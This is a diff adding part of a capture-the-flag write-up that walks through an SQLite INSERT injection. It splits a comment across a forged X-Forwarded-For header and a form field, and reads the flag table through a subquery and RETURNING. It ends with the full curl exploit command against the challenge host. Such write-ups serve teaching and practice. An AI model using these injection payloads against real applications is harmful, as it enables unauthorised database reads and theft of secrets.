@@ -670,3 +670,43 @@ INSERT INTO secrets (ip, secret)
             secret = excluded.secret
         RETURNING id
 ```
+- The next step is to insert a subquery with the second insert value argument to read flag from flag.
+> While inserting the flag value, it will get saved in column secret which can also return later and read in our cookie
+```sql
+INSERT INTO secrets (ip, secret)
+        VALUES (''/*', '*/,(SELECT "flag" from flag))/*')
+        ON CONFLICT(ip) DO UPDATE SET
+            secret = excluded.secret
+        RETURNING id
+```
+
+- Lastly, the keyword `RETURNING` allows us to return values in `sqlite3` which is  useful.We can also return another column as another e.g `secret` instead of id.
+
+```sqlite3
+RETURNING secret as id
+```
+
+- Final visual idea-:
+
+```sqlite3
+INSERT INTO secrets (ip, secret)
+        VALUES (''/*', '*/,(SELECT "flag" from flag)) RETURNING secret as id/*')
+        ON CONFLICT(ip) DO UPDATE SET
+            secret = excluded.secret
+        RETURNING id
+```
+
+- Curling time-:
+
+```bash
+curl -v http://34.170.146.252:23733/set -H "X-Forwarded-For: '/*" -d 'secret=*/,(SELECT "flag" from flag)) RETURNING secret as id/*'
+```
+
+<img width="910" height="267" alt="image" src="https://github.com/user-attachments/assets/1b9952b3-1eb2-40d6-a57e-dde7910233dd" />
+
+- Flag-:
+
+<img width="768" height="55" alt="image" src="https://github.com/user-attachments/assets/32f4c664-6ac4-413c-80dd-1e0898d5acfd" />
+
+-------------------
+
